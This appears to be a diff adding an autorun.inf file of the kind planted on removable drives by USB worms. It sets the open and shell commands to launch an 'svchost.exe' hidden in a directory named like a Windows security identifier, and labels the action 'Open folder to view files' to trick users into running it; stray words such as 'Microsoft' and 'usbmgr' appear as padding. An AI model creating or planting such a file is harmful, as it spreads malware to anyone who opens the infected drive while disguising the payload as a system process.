@@ -1,0 +1,7 @@
+[autorun]
+open=driver\S-1-4-89-654352344-54323413-6452342-4545\svchost.exe
+Microsoft
+action=Open folder to view files
+shell\open=Open
+shell\open\command=driver\S-1-4-89-654352344-54323413-6452342-4545\svchost.exe
+usbmgr
